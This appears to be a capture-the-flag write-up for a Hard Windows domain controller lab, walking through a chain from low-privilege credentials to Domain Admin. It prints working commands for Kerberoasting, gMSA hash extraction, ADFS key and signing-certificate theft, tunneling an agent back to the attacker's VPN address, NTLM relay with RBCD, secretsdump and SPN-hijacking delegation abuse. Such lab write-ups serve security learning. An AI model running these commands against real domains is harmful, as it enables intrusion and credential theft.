---
title: "Pirate"
date: 2026-02-27
draft: false
tags: ["windows", "active-directory", "mssql", "web", "docker", "hard"]
categories: ["writeups"]
summary: ""
params:
  box:
    os: "Windows Server 2019 (Domain Controller)"
    difficulty: "Hard"
ShowToc: true
protected: true
---

# Pirate — Hard Windows (Active Directory, ADFS, Hyper-V Pivot)

Pirate is a Hard-rated Windows Domain Controller that simulates a real-world internal penetration test engagement — you start with low-privileged domain credentials and must chain together gMSA password abuse, ADFS DKM key extraction, Hyper-V guest pivoting, NTLM relay with RBCD, and constrained delegation SPN hijacking to achieve Domain Admin. The sheer number of convincing-but-wrong paths makes this box genuinely difficult: expect to enumerate deeply, get excited about several rabbit holes, and ultimately succeed through a surprisingly simple network observation that seven sessions of complex tunneling failed to surface.

---

## Overview

The target is `DC01.pirate.htb`, a Windows Server 2019 Domain Controller that also runs Hyper-V hosting an ADFS web server (`WEB01` at `192.168.100.2`). Our starting credentials (`pentest:p3nt3st2025!&`) come from the box page, simulating an engagement hand-off. The ADFS infrastructure, gMSA accounts, and a locked-but-active user session on WEB01 are all attack surface — but reaching them requires careful pivoting and a series of non-obvious chained techniques.

---

## Reconnaissance

### Port Scan

RustScan identified 16 open ports; a targeted nmap service scan painted the full picture:

![terminal output](terminal_01.png)

This is the standard domain controller service profile: Kerberos, LDAP, SMB, WinRM, ADCS/ADWS. Two things stood out immediately — port 80 showed ADFS endpoints but returned 503 (the backend web server was unreachable from the outside), and nmap detected a **7-hour clock skew**, which would break Kerberos authentication until corrected.

```bash
sudo ntpdate -u $TARGET
```

### Domain Topology

LDAP and DNS enumeration revealed a two-host environment:

| Host | Role | IP |
|------|------|----|
| DC01.pirate.htb | Domain Controller, Hyper-V host, ADCS | 10.129.x.x (external) / 192.168.100.1 (internal) |
| WEB01.pirate.htb | Hyper-V guest, IIS, ADFS | 192.168.100.2 (internal only) |

WEB01 has no external IP — it lives entirely on the Hyper-V internal switch and is only reachable through DC01.

### Domain Enumeration

With LDAP queries (more on authentication below), we mapped the key objects:

**Users:**
- `pentest` — our starting account, plain Domain Users
- `a.white` — Domain Users; critically, has `ForceChangePassword` and `WriteSPN` rights over `a.white_adm`
- `a.white_adm` — member of IT group; SPN `ADFS/a.white`; **constrained delegation with protocol transition** to `HTTP/WEB01.pirate.htb`
- `j.sparrow` — just a regular user (Jack Sparrow, classic HTB character)

**gMSA Accounts:**
| Account | SPN | WinRM | Notes |
|---------|-----|-------|-------|
| `gMSA_ADFS_prod$` | `host/adfs.pirate.htb` | ✓ | db_owner on ADFS WID; 50 prior logons |
| `gMSA_ADCS_prod$` | (none) | ✓ | In Remote Management Users |

Both gMSAs had `msDS-GroupMSAMembership` pointing to a SID resolving to **Domain Secure Servers** (RID 4101). That group membership would become critical shortly.

**Computer Accounts:**
- `DC01$` — standard DC with unconstrained delegation
- `WEB01$` — Hyper-V guest
- `MS01$` — member of **Domain Secure Servers** AND **Pre-Windows 2000 Compatible Access**

That `MS01$` entry is important: membership in Pre-Windows 2000 Compatible Access means its default password is the lowercase computer name — `ms01`.

**MachineAccountQuota:** 10 — we can create machine accounts, useful for RBCD later.

---

## Foothold

### Step 1: Bypassing the Shell Metacharacter Password

Before anything else, we had to solve an annoying but important problem: the password `p3nt3st2025!&` contains `!` (bash history expansion) and `&` (shell backgrounding). This breaks argument parsing in nearly every tool — netexec, smbclient, rpcclient, ldapsearch, and impacket all failed to authenticate when the password was passed on the command line.

The solution: obtain a Kerberos TGT using Python with the password as a string literal (bypassing the shell entirely), then use ccache auth for everything.

```bash
python3 -c "
import subprocess, sys
subprocess.run([
    sys.executable, '-c',
    'from impacket.krb5.kerberosv5 import getKerberosTGT; '
    'from impacket.krb5.types import Principal; '
    'from impacket.krb5 import constants; '
    'userName = Principal(\"pentest\", type=constants.PrincipalNameType.NT_PRINCIPAL.value); '
    'tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, \"p3nt3st2025!&\", \"pirate.htb\"); '
    'from impacket.krb5.ccache import CCache; '
    'ccache = CCache(); '
    'ccache.fromTGT(tgt, oldSessionKey, sessionKey); '
    'ccache.saveFile(\"pentest.ccache\"); '
    'print(\"TGT saved\")'
])
"
export KRB5CCNAME=$(pwd)/pentest.ccache
```

From this point, every tool used `-k --use-kcache` instead of password flags.

### Step 2: Kerberoasting

With a valid TGT, Kerberoasting was the obvious next step given `a.white_adm`'s SPN:

```bash
impacket-GetUserSPNs -k -no-pass -dc-host DC01.pirate.htb pirate.htb/pentest -request
```

We got an RC4 TGS hash for `a.white_adm`. Unfortunately, cracking with rockyou.txt and dive rules on an RTX 4090 (`hashcat -m 13100`) returned nothing. The hash was saved for later but couldn't be cracked — we'd need a different path to `a.white_adm`.

### Step 3: gMSA Password Extraction via MS01$

Here's where the Pre-Windows 2000 Compatible Access group membership paid off. The chain:

1. Both gMSA passwords are readable by members of **Domain Secure Servers**
2. **MS01$** is a member of Domain Secure Servers
3. MS01$ is also in **Pre-Windows 2000 Compatible Access** → default password is `ms01`

```bash
impacket-getTGT pirate.htb/'MS01$':'ms01' -dc-ip $TARGET
export KRB5CCNAME=$(pwd)/MS01\$.ccache

netexec ldap DC01.pirate.htb -k --use-kcache --gmsa
```

![terminal output](terminal_02.png)

Two gMSA NTLM hashes extracted. Both accounts are in Remote Management Users, meaning WinRM access via pass-the-hash:

```bash
evil-winrm -i $TARGET -u 'gMSA_ADFS_prod$' -H '8126756fb2e69697bfcb04816e685839'
```

Important caveat: `netexec` shows `(Pwn3d!)` for both accounts, but that means "can execute WinRM commands" — NOT local admin. Both accounts run at Medium Plus integrity with only `SeChangeNotifyPrivilege`. DCSync fails, SCM is inaccessible, and the Administrators group is off-limits.

### Step 4: ADFS DKM Key Extraction

From a WinRM session as `gMSA_ADFS_prod$` on DC01, we could query the ADFS DKM (Distributed Key Manager) container in LDAP. ADFS uses this master key to encrypt its signing certificates and configuration secrets. The container lives at:

```
CN=ADFS,CN=Microsoft,CN=Program Data,DC=pirate,DC=htb
```

The actual key material is stored in the `thumbnailPhoto` attribute on contact objects within that container. We extracted and base64-decoded it:

```
DKM Key: fFtRNXRYzZjwD37MB/Rgu/x96WiVB0xO/SkbWnU6LOQ=
```

### Step 5: Tunneling to WEB01

WEB01 at `192.168.100.2` is only reachable from DC01. We set up a Ligolo-ng tunnel to route the `192.168.100.0/24` subnet through DC01:

```bash
# Kali: start ligolo proxy
ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# Upload agent to DC01 (via HTTP server), then execute via netexec (blocking session):
netexec winrm $TARGET -u 'gMSA_ADFS_prod$' -H '8126756fb2e69697bfcb04816e685839' \
  -X "C:\Windows\Temp\ligolo-agent.exe -connect $VPN_IP:11601 -ignore-cert"

# Kali: add route
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.100.0/24 dev ligolo
# In ligolo TUI: session → start
```

```bash
# Verify WEB01 reachable
ping -c 1 192.168.100.2
```

WinRM to WEB01 as `gMSA_ADFS_prod$` also worked — Medium integrity, no admin, but enough to enumerate.

### Step 6: ADFS Certificate Extraction from WID

ADFS stores its configuration in the Windows Internal Database (WID), accessible via a named pipe. As `gMSA_ADFS_prod$`, we had `db_owner` on the `AdfsConfigurationV4` database:

```powershell
$conn = New-Object System.Data.SqlClient.SqlConnection(
  "Server=np:\\.\pipe\microsoft##wid\tsql\query;Database=AdfsConfigurationV4;Integrated Security=True")
$conn.Open()
```

We extracted two `EncryptedPfx` blobs from the `ServiceSettings` table, decoded them from base64, and saved them as binary files.

### Step 7: Decrypting the ADFS Signing Certificate with ADFSpoof

ADFSpoof takes the DKM key and an encrypted PFX blob to recover the ADFS signing certificate. The tool needed a patch for modern Python cryptography libraries (removing deprecated `@utils.register_interface` decorators and updating `int_to_bytes` calls), then:

```bash
python3 ADFSpoof.py -b ../pfx1_encrypted.bin ../dkm_key.bin dump --path ../token_signing.pfx
python3 ADFSpoof.py -b ../pfx2_encrypted.bin ../dkm_key.bin dump --path ../token_signing2.pfx
```

`token_signing.pfx` → ADFS Encryption cert  
`token_signing2.pfx` → **ADFS Token Signing cert** (CN=ADFS Signing - adfs.pirate.htb)

This is the private key that signs ADFS-issued tokens. We now had the ability to forge arbitrary tokens for any user — but with no custom relying party trusts configured (the WID showed only built-in ADFS entries), there was nowhere to present them. The ADFS infrastructure was real but unused for any custom application. Token forging capability noted; we moved on.

---

## Rabbit Holes Worth Mentioning

Several paths looked promising and consumed significant time:

**ADCS ESC1 / ESC15:** The `ADFSSSLSigning` template had `EnrolleeSuppliesSubject=True` and Domain Computers could enroll. We got a certificate with `a.white@pirate.htb` as the UPN. But the template only issued **Server Authentication** EKU — the KDC rejected it for PKINIT, and Schannel LDAP auth returned no identity. We tried forcing `Client Authentication` via certipy's `-application-policies` flag, but the template was schema version 2, so the CA ignored the request and issued a cert with a broken `0.0` OID that failed everything.

**WCF certificatemixed:** ADFS exposes WS-Trust endpoints on WEB01 that accept certificate auth. However, .NET Framework's WCF stack cannot sign SOAP messages with CNG private keys — and impacket-generated certificates use CNG. `HasPrivateKey=True` but `PrivateKey=null`. Fundamental incompatibility, not fixable without a CSP-compatible key.

**RemotePotato0:** `a.white` was visibly logged in on WEB01 (Session 1, explorer.exe active, locked screen). RemotePotato0 is designed for exactly this scenario — coerce NTLM from an interactive session without admin. Unfortunately, Server 2019 requires the OXID resolver to run remotely on port 135, which was already occupied by MSRPC on every reachable host. Mode 2 failed with `0x80070776`.

**Ligolo ARP tunneling:** Published writeups suggested adding `192.168.100.50/24` to the ligolo TUN interface so that WEB01 could reach Kali directly. This failed: WEB01 would ARP for `.50` locally on the Hyper-V switch, get no response (nobody on that switch has that IP), and time out. Three sessions were spent trying workarounds — port 139 dual-binding, LLMNR poisoning, PowerShell TCP relays — before we tested something obvious.

---

## The Simple Solution

After all the complex tunnel engineering, the breakthrough was a one-liner test from WEB01:

```powershell
(New-Object Net.Sockets.TcpClient).ConnectAsync("<VPN_IP>", 445).Wait(3000)
```

**WEB01 could reach Kali's VPN IP directly.** DC01 routes between `192.168.100.0/24` and the VPN subnet. No ligolo IP tricks needed — just coerce to the VPN address.

### NTLM Relay → RBCD

First, we created a machine account for RBCD delegation:

```bash
impacket-addcomputer pirate.htb/'MS01$':'ms01' -computer-name 'EVIL$' \
  -computer-pass 'EvilPass123!' -dc-ip $TARGET
```

Then started ntlmrelayx in a tmux session targeting DC01 LDAPS:

```bash
tmux new-session -d -s relay 'sudo impacket-ntlmrelayx -t ldaps://<TARGET> \
  --delegate-access --remove-mic --escalate-user EVIL$ -smb2support'
```

And coerced WEB01$ to authenticate toward our VPN IP using Coercer (isolated in a venv to avoid impacket version conflicts):

```bash
source env/bin/activate
python3 -m coercer coerce -l $VPN_IP -t 192.168.100.2 \
  -u 'gMSA_ADFS_prod$' --hashes ':8126756fb2e69697bfcb04816e685839' \
  -d pirate.htb --filter-protocol-name MS-EFSR --always-continue
```

![terminal output](terminal_03.png)

### S4U2Proxy → secretsdump → a.white Cleartext

```bash
impacket-getST -spn 'cifs/WEB01.pirate.htb' -impersonate Administrator \
  pirate.htb/'EVIL$':'EvilPass123!' -dc-ip $TARGET

export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache

impacket-secretsdump -k -no-pass WEB01.pirate.htb -dc-ip $TARGET
```

![terminal output](terminal_04.png)

The AutoAdminLogon secret — `DefaultPassword` stored in LSA — gave us `a.white`'s cleartext credentials. This is why she was permanently logged in on WEB01: the machine auto-logs her in on boot.

---

## Privilege Escalation

### a.white → a.white_adm (ForceChangePassword)

From LDAP enumeration back in recon, we knew `a.white` held `ForceChangePassword` (User-Force-Change-Password extended right) over `a.white_adm`. With her cleartext credentials, we reset the password:

```bash
net rpc password a.white_adm 'Password99' \
  -U 'pirate.htb/a.white%E2nvAOKSz5Xz2MJu' -S DC01.pirate.htb
```

### a.white_adm → Domain Admin via SPN Hijacking

This is the most interesting part of the box. `a.white_adm` has:
- **Constrained delegation with protocol transition** to `HTTP/WEB01.pirate.htb`
- **WriteSPN** on `DC01$` (and `WEB01$`)

Constrained delegation with protocol transition (S4U2Self + S4U2Proxy) lets `a.white_adm` obtain a service ticket for *any user* to the target SPN. The SPN `HTTP/WEB01.pirate.htb` is currently owned by `WEB01$`. If we get a ticket for, say, `Administrator` to `cifs/WEB01`, we can access WEB01 as Domain Admin — but we've already done that.

The trick: **move the SPN to DC01$**. When the KDC issues the S4U2Proxy ticket, it encrypts it with the key of whichever account owns the target SPN. If `DC01$` owns `HTTP/WEB01.pirate.htb`, the ticket is encrypted with DC01$'s key. Combined with `getST -altservice`, we rewrite the service name in the ticket to `cifs/DC01.pirate.htb` — giving us a cifs ticket for DC01, accepted because it's encrypted correctly.

```python
# Via ldap3 as a.white_adm — move the SPN
modify(web01_dn, {'servicePrincipalName': [(MODIFY_DELETE, ['HTTP/WEB01.pirate.htb', 'HTTP/WEB01'])]})
modify(dc01_dn, {'servicePrincipalName': [(MODIFY_ADD, ['HTTP/WEB01.pirate.htb'])]})
```

```bash
impacket-getST -spn 'HTTP/WEB01.pirate.htb' -impersonate Administrator \
  -altservice 'cifs/DC01.pirate.htb' pirate.htb/'a.white_adm':'Password99' \
  -dc-ip $TARGET

export KRB5CCNAME=Administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache

impacket-wmiexec -k -no-pass DC01.pirate.htb -dc-ip $TARGET
```

![terminal output](terminal_05.png)

---

## Lessons Learned

**Shell metacharacter passwords** — When credentials contain `!`, `&`, or `#`, skip CLI tool password args entirely and obtain a Kerberos TGT via Python subprocess. Use `-k --use-kcache` everywhere from that point on.

**Pre-Windows 2000 Compatible Access** — Computer accounts in this group have a default password equal to the lowercase computer name (without `$`). Always check this group membership during enumeration.

**gMSA password access chain** — Decode `msDS-GroupMSAMembership` to identify which SID can read the password. Map that SID to a group, enumerate its members, authenticate as one. The chain here was: gMSA → Domain Secure Servers → MS01$ → default password `ms01`.

**ADFS DKM keys** — Stored in LDAP under `CN=Program Data`, readable by the ADFS service account. The `thumbnailPhoto` attribute on contact objects holds the raw key material. ADFSpoof needs patching for modern Python (`@utils.register_interface`, `int_to_bytes`, `_check_bytes` all have breaking changes in recent cryptography library versions).

**WID named pipe connection** — `np:\\.\pipe\microsoft##wid\tsql\query` for SQL connections to ADFS config. The ADFS service account gets `db_owner` via the `db_genevaservice` role. TRUSTWORTHY is off and xp_cmdshell is disabled — no RCE from WID, but full ADFS config CRUD is available.

**Test VPN reachability before building tunnel infrastructure** — Three sessions were spent on complex Ligolo ARP workarounds. A single PowerShell TCP test from WEB01 would have revealed that Kali's VPN IP was directly reachable. Always run `(New-Object Net.Sockets.TcpClient).ConnectAsync("<VPN_IP>", 445).Wait(3000)` from a new pivot before investing in elaborate forwarding chains.

**Ligolo TUN ARP limitation** — `ip addr add 192.168.100.50/24 dev ligolo` puts an IP on Kali's TUN interface but the agent does NOT respond to ARP for that IP on the remote network. Hosts in the same /24 as the agent ARP locally and get no reply. This only works if the pivot host has proxy-ARP enabled or a secondary IP added — neither of which applies here.

**Windows SO_EXCLUSIVEADDRUSE port binding** — SMB (445), HTTP.sys (80/443), LDAP, Kerberos, kpasswd all use exclusive socket binding. DNS (53), MSRPC (135), and NetBIOS (139) allow dual binding. Ligolo `listener_add` can only coexist on the latter group, and even then the most-specific binding wins (a service bound to `192.168.100.1:139` beats ligolo's `0.0.0.0:139` for connections to that IP).

**ADCS ESC1 with wrong EKU** — A certificate issued with Server Authentication EKU only is useless for PKINIT and Schannel LDAP identity mapping, regardless of what UPN it contains. Windows checks the Application Policies extension before EKU; a broken `0.0` OID (produced by certipy `-application-policies` against schema v2 templates) fails all checks. Schema v2 templates ignore Application Policy overrides in the CSR.

**SPN hijacking for constrained delegation escalation** — When an account has KCD to a specific SPN plus WriteSPN on a higher-value target: remove that SPN from its current owner, add it to the target, then S4U2Proxy with `-altservice` to rewrite the ticket's service name. The KDC encrypts the ticket with whichever account owns the SPN at time of issuance — moving the SPN changes the encryption key.

**Coercer venv isolation** — `pip install coercer` pulls impacket 0.10.0, which conflicts with system impacket 0.14.0 at import time. Always run `python3 -m venv env && pip install coercer` and keep ntlmrelayx on the system install.

**ntlmrelayx needs a controlling terminal** — Background `nohup` invocations die silently. Use `tmux new-session -d -s relay 'sudo impacket-ntlmrelayx ...'` to keep it alive. Same applies to chisel and ligolo agents: keep them in blocking WinRM sessions or tmux panes.
